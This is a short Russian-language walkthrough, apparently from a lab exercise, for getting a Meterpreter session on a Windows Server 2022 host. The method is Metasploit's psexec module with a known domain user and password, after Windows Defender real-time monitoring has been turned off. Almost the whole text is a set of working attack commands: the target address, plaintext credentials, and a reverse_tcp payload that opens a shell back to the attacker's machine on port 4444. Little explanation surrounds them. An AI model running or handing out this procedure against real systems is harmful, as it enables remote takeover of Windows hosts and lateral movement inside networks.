
### Получение стабильной сессии Meterpreter

**Исходные данные:**
- Windows Server 2022 (192.168.211.10), домен `lab.local`.
- Учётные данные: пользователь `ansible` с паролем `Pass123!`.
- Windows Defender на сервере отключён (`Set-MpPreference -DisableRealtimeMonitoring $true`).
- Атакующая машина: Kali Linux (192.168.47.52) в сети VMnet1.

**Выполнение:**

Запускаем Metasploit Framework:

```bash
msfconsole
```

Выбираем модуль `exploit/windows/smb/psexec` – он позволяет выполнить произвольный код на удалённой Windows-системе через SMB с использованием механизма служб.

```bash
use exploit/windows/smb/psexec
```

Устанавливаем необходимые параметры:

```bash
set RHOSTS 192.168.211.10
set SMBUser ansible
set SMBPass Pass123!
set SMBDomain lab
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.47.52
set LPORT 4444
set EXITFUNC thread
```

- `EXITFUNC thread` – обеспечивает более чистый выход полезной нагрузки без завершения процесса-родителя.
- `PAYLOAD` выбран 64-битный для совместимости с целевой ОС.

Запускаем эксплуатацию:

```bash
run
```
